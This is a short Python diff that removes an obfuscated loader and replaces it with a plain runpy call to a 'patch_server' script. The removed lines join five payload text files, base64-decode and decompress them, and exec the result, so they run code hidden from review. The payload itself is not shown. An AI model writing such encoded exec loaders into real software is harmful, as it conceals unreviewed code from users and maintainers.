@@ -1,9 +1,5 @@
 from pathlib import Path
-import base64
-import zlib
+import runpy
 
-payload = ''.join(
-    Path(f'scripts/bal027_payload_{index:02d}.txt').read_text().strip()
-    for index in range(5)
-)
-exec(zlib.decompress(base64.b64decode(payload)).decode())
+ROOT = Path(__file__).resolve().parents[1]
+runpy.run_path(str(ROOT / 'scripts/bal027_patch_server.py'), run_name='__main__')
